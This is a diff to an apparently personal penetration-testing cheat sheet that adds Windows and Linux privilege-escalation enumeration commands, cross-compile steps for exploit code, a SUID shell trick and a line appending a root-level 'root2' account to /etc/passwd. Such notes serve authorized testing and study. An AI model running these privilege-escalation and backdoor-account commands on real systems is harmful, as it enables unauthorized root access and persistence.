@@ -69,11 +69,22 @@ Get-ExecutionPolicy -Scope CurrentUser
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
 
-#### EXAMPLE COMMANDO
+## Compiling
+#### Compile on linux
 ```
-<COMMANDO>
+gcc
 ```
- 
+
+#### Cross compile exploit code
+```
+sudo apt install mingw-64
+```
+
+#### Compile 32bit
+```
+i686-w64-mingw32-gcc something.c -o something
+```
+
 # Buffer overflow
 To find and exploit a buffer overflow the following steps should be executed:
    1. **Spiking:** Find the vulnerable parameter
@@ -666,7 +677,194 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 - Restart service in powershell. 
 -   ```restart-service  <SERVICE>```
 
+#### Check the current user
+```
+whoami
+```
+
+#### Check all the users
+```
+net user
+```
+
+#### Check hostname
+```
+hostname
+```
+
+#### Check operatingsystem and architecture
+```
+systeminfo
+```
+
+#### Check Running processes
+```
+tasklist /svc
+```
+
+#### Check running services
+```
+wmic service get name,displayname,pathname,startmode
+```
+
+#### Check permission on file
+```
+icalcs "<PATH>"
+```
+
+#### Check current privileges
+```
+whoami /priv; whoami /groups
+```
+if SeImpersonatePrivilege is set (https://github.com/itm4n/PrintSpoofer or juicypotato)
+
+#### Check networking information
+```
+ipconfig /all
+route print
+```
+
+#### Check open ports
+```
+netstat -ano
+```
+
+#### Enumerate firewall
+```
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+```
+
+#### Enumerate scheduled task
+```
+schtasks /query /fo LIST /v
+```
+
+#### Installed applications and patch levels
+```
+wmic product get name, version, vendor
+```
+
+#### Readable/writable files and directories
+```
+accesschk.exe -uws "Everyone" "C:\Program Files"
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+```
+
+#### Unmounted disks
+```
+cat /etc/fstab
+mount
+/bin/lsblk
+mountvol
+```
+
+#### Device drivers and kernal modules
+```
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*<DRIVER>*"}
+```
+
+#### Binaries that auto elevate
+Check status of AlwaysInstalledElevated registery setting (if yes then craft a MSI)
+```
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+```
+
+#### Check the architecture
+```
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+
+#### Check for drivers
+```
+driverquery /v
+```
+
+#### Check the driver files for version etc and check if it’s vulnerable
+```
+cd C:\Program Files\<DRIVER>
+```
+
 ### Linux
+#### Check the current user
+```
+whoami; id
+```
+
+#### Check all the users
+```
+cat /etc/passwd
+```
+
+#### Check hostname
+```
+hostname
+```
+
+#### Check operatingsystem and architecture
+```
+cat /etc/*release*; cat /etc/*issue*; uname -a; arch
+```
+
+#### Check Running processes
+```
+ps aux
+```
+
+#### Check current privileges
+```
+sudo -l
+```
+
+#### Check networking information
+```
+ifconfig
+ip a
+routel
+```
+
+#### Check open ports
+```
+netstat -tulpn
+```
+
+#### Enumerate firewall
+```
+cat etc/iptables/*
+```
+
+#### Enumerate scheduled task
+```
+ls -lah /etc/cron*
+cat /etc/crontab
+```
+
+#### Installed applications and patch levels
+```
+dpkg -l
+```
+
+#### Readable/writable files and directories
+```
+find / -writable -type d 2>/dev/null
+```
+
+#### Unmounted disks
+```
+cat /etc/fstab
+mount
+/bin/lsblk
+mountvol
+```
+
+#### Device drivers and kernal modules
+```
+lsmod
+/sbin/modinfo <MODULE>
+```
+
 #### Find suit bits
 ```
 find / -perm -u=s -type f 2>/dev/null
@@ -681,7 +879,16 @@ If a binary has a SUID and doesn’t use full path for executing something, you 
 #### Run SUID BIT
 Use the following instead of just sudo <PROGRAM>
 ```
-sudo -u root <PATH TO PROGRAM>
+sudo -u root <PATH TO PROGRAM> #manier1
+./.suid_bash -p #manier2
+```
+  
+### Privesc Linux Tricks
+#### Write to /etc/passwd
+```
+openssl passwd <PASS> #generate password
+echo "root2:<OPENSSL OUTPUT>:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2 #sudo to root with the password set
 ```
 
 ## File transfers
